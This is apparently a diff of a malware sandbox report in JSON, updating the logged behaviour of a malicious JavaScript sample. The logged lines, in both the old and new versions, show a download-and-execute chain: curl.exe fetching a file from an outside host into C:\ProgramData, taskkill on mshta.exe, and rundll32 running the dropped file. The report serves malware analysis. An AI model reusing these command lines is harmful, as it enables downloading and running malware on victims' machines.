@@ -83,7 +83,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[16]\n\n\t\tnew WScript.Shell[18]\n\n\t\tnew WScript.Shell[20]\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[11]()\n\n\t\tnew WScript.Shell[13]()\n\n\t\tnew WScript.Shell[15]()\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -105,7 +105,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/wR...\n\t\tWScript.Shell[20].Run(taskkill /f /im mshta.exe, 0, undefined)\n",
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[13].run(\"curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/w...\n\t\tWScript.Shell[15].run(\"taskkill /f /im mshta.exe\", 0)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -127,7 +127,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[18].Run(curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/wR...\n\t\tWScript.Shell[20].Run(taskkill /f /im mshta.exe, 0, undefined)\n",
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[13].run(\"curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/w...\n\t\tWScript.Shell[15].run(\"taskkill /f /im mshta.exe\", 0)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -149,7 +149,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[19].ShellExecute(rundll32,C:\\ProgramData\\1.png,Wind,,open,3)\n",
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[14].shellexecute(\"rundll32\", \"C:\\ProgramData\\1.png,Wind\", \"\", \"open\", 3)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -269,7 +269,7 @@
     "extracted": [
       {
         "name": "extracted_wscript.bat",
-        "sha256": "0435a4727d2a8f71ecdd5b510cec45e05bf4fbeba42b1eb80655da8ccea81c6e"
+        "sha256": "2474ee793671ab84c63145a29c2125150e7b1f868c9ab5a1a68271741fa17751"
       }
     ],
     "supplementary": [
